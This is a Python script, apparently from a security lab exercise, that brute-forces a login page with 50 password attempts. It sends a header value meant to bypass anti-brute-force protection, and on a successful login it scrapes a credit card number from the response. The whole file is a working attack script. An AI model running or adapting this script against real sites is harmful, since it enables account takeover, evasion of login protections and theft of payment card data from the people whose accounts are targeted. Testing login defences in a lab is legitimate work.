#!/usr/bin/env python
import requests 
import random
import string
import re

url = "http://lab.spm.pl/login.php"
headers = {'BCHTags': 'BYPASS-ABP'}
headers2 = {'Content-Type': 'application/x-www-form-urlencoded', 'bchtags': 'BYPASS-ABP'}
letters = string.ascii_letters + string.digits


s = requests.Session()
s.get('https://lab.spm.pl', headers=headers)
s.get(url, headers=headers)


i = 1
imax = 50
while i <= imax:
    if i == imax:
        password = "Test123123%23"
    else:
        password = ''.join(random.choice(letters) for i in range(10))

    print("Sending request " + str(i) + " of " + str(imax) + ". Password:  " + password + "")
    data = "username=bartoszch&password=" + password + "&login="
    r = s.post(url, data=data, headers=headers2)
    response = r.text
    if "You have a valid session" in response:
        print("Login Successful!!!")
        cc = re.findall(r"\d\d\d\d \d\d\d\d \d\d\d\d \d\d\d\d", response)
        print("CC Number:", cc[0])
    elif "Wrong username or password" in response:
        print("Login Failed...")
    else:
        print("Result unknown...")

    i += 1

input("Press Enter to continue...")

